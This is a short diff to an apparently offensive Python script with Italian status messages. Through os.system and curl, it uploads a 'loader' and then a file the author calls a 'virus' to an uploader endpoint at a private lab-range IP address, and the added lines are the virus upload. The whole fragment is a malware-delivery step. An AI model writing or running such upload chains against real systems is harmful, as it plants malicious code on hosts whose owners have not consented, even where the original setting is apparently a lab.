@@ -16,3 +16,6 @@ print("caricamento loader")
 curl_cmd = f"curl -X POST -F \"file=@loader\" http://192.168.56.101:8080/uploader"
 os.system(curl_cmd)
 
+print("caricamento virus")
+curl_cmd = f"curl -X POST -F \"file=@{virus}\" http://192.168.56.101:8080/uploader"
+os.system(curl_cmd)
